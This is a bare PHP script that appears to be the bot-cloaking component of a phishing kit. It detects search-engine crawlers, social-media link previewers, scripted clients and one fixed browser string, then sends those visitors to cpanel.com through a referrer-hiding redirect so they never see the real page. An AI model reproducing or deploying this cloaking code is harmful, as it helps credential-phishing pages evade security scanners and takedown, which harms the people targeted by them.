<?php

if(strpos($_SERVER['HTTP_USER_AGENT'], 'google') 
    or strpos($_SERVER['HTTP_USER_AGENT'], 'Java') 
    or strpos($_SERVER['HTTP_USER_AGENT'], 'FreeBSD') 
    or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot') 
    or strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp') 
    or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker') 
    or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') 
    or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot') 
    or strpos($_SERVER['HTTP_USER_AGENT'], 'YandexBot') 
    or strpos($_SERVER['HTTP_USER_AGENT'], 'TelegramBot') 
    or strpos($_SERVER['HTTP_USER_AGENT'], 'TwitterBot') 
    or strpos($_SERVER['HTTP_USER_AGENT'], 'googlebot-Image/1.0') 
    or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler')  
    or strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL') 
    or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false) {
    
    exit(header("Location: https://utilify.me/hide-referrer/http://www.cpanel.com"));
}

if ($_SERVER['HTTP_USER_AGENT'] == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
    exit(header("Location: https://utilify.me/hide-referrer/http://www.cpanel.com"));
}
?>